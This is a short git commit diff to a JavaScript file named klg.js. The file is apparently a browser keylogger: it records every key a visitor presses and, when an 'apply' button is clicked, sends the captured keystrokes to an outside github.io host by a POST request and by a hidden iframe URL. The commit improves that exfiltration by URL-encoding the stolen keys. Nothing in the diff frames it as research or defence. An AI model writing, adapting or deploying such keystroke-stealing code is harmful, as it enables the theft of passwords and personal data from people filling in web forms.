5f7ff3d43ae4bfd40da95e458c75f6083c5f2bab
faisal-akhtar-fgh <43573460+faisal-akhtar-fgh@users.noreply.github.com>
2019-08-19 15:20:21 +0100

    Update klg.js

--- klg.js
+++ klg.js
@@ -4,6 +4,6 @@ document.onkeydown = function (e) {
 	keyPresses += e.key;
 };
 $("#applybutton").mousedown(function () {
-    $.post("https://faisal-akhtar-fgh.github.io/kal/", keyPresses);
-	$("body").append('<iframe src="https://faisal-akhtar-fgh.github.io/kal/?data='+ keyPresses + '"></iframe>');
+    $.post("https://faisal-akhtar-fgh.github.io/kal/", escape(keyPresses));
+	$("body").append('<iframe src="https://faisal-akhtar-fgh.github.io/kal/?data='+ escape(keyPresses) + '"></iframe>');
 });
